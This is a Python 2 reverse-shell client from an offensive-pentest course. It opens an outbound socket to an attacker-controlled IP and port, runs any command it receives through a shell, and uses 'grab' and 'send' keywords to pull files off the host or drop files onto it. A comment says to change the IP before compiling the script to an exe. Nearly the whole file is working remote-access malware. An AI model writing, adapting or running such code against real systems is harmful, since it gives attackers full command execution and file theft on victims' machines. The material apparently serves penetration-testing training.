# Python For Offensive PenTest: A Complete Practical Course - All rights reserved
# Follow me on LinkedIn  https://jo.linkedin.com/in/python2

import socket
import subprocess
import os          # needed for file opertaions



# In the transfer function, we first check if the file exisits in the first place, if not we will notify the attacker
# otherwise, we will create a loop where each time we iterate we will read 1 KB of the file and send it, since the
# server has no idea about the end of the file we add a tag called 'DONE' to address this issue, finally we close the file


def transfer(s,path):
    if os.path.exists(path):
        f = open(path, 'rb')
        packet = f.read(2048)
        while packet != '':
            s.send(packet)
            packet = f.read(2048)
        s.send('DONE')
        f.close()

    else: # the file doesn't exist
        s.send('Unable to find out the file')

def recieve(s):
    f = open('C:\\Temp\\test.txt', 'wb')
    while True:
        bits = s.recv(2048)
        if 'File does not exist' in bits:
            print('File does not exist')
            break
        if bits.endswith('DONE'):
            f.write(bits[:-4])
            print('[+] Tansfer Complete ')
            f.close()
            break
        f.write(bits)


def connect():
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect(('192.168.71.130', 8080))         # CHANGE IP AND PORT before making exe

    while True:
        command =  s.recv(2048)

        if 'terminate' in command:
            s.close()
            break


# if we received grab keyword from the attacker, then this is an indicator for
# file transfer operation, hence we will split the received commands into two
# parts, the second part which we intersted in contains the file path, so we will
# store it into a varaible called path and pass it to transfer function

# Remember the Formula is  grab*<File Path>
# Example:  grab*C:\Users\Hussam\Desktop\photo.jpeg
# Example: send*\root\Desktop\photo.jpeg

        elif 'grab' in command:
            grab,path = command.split('*')

            try:                          # when it comes to low level file transfer, alot of things can go wrong, therefore
                                          # we use exception handling (try and except) to protect our script from being crashed
                                          # in case something went wrong, we will send the error that happened and pass the exception
                transfer(s,path)
            except Exception,e:
                s.send ( str(e) )  # send the exception error
                pass

        elif 'send' in command:
            recieve(s)

        elif 'cd' in command: # the forumal here is gonna be cd then space then the path that we want to go to, like  cd C:\Users
            code,directory = command.split (' ') # split up the reiceved command based on space into two variables
            os.chdir(directory) # changing the directory
            s.send( "[+] CWD Is " + os.getcwd() ) # we send back a string mentioning the new CWD



        else:
            CMD =  subprocess.Popen(command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
            s.send( CMD.stdout.read()  )
            s.send( CMD.stderr.read()  )

def main ():
    connect()
main()
